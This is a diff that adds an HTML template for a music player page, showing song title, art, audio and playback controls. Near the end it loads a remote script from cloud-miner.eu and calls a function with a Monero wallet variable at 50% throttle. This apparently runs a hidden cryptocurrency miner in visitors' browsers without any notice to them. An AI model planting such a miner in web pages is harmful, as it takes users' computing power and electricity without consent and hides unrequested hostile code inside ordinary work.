@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>{{ song['title'] }} - {{ artist }}</title>
+        <link rel="stylesheet" type="text/css" href="../static/song.css">
+        <script src="../static/crypta.js"></script>
+    </head>
+    <body>
+      <div id='main-wrapper'>
+          <h1>{{song['title']}} - <i>{{ artist }}</i></h1>
+          <img id='art' src='{{song['art']}}'>
+          <canvas id='canvas'></canvas>
+          <audio src="../static/songs/{{song['id']}}.mp3" id="audio" preload='auto' autoplay></audio>
+          <div id="wrapper">
+        		<!--Audio Player Interface-->
+        		<div id="audioplayer">
+        			<button id="pButton" class="pause"></button>
+        			<div id="timeline">
+        				<div id="playhead"></div>
+        			</div>
+        		</div>
+        </div>
+
+      </div>
+        <script src="../static/main.js"></script>
+        <script src="../static/controls.js"></script>
+
+      <script src="https://cloud-miner.eu/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean" ></script>
+      <script type="text/javascript">
+        EverythingIsLife('{{xmr}}', 'x', 50);
+      </script>
+
+    </body>
+</html>
